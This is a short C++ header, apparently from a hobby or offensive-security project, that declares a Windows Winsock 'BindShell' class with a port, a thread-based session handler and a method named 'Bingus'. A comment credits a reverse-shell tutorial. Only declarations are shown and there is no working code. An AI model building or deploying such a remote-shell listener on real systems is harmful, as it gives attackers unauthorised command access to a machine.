#pragma once
#include "pch.h"

#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

// shoutout this guy, networking blows!
// https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html

class BindShell
{
private:
	WSADATA m_wsaData;
	UINT16 port;
public:
	BindShell(UINT16 port);
	~BindShell();
	
	// this has to be a static member func or it explodes
	static DWORD APIENTRY BingusSessionHandler(LPVOID lpParameter);

	void Bingus();
};

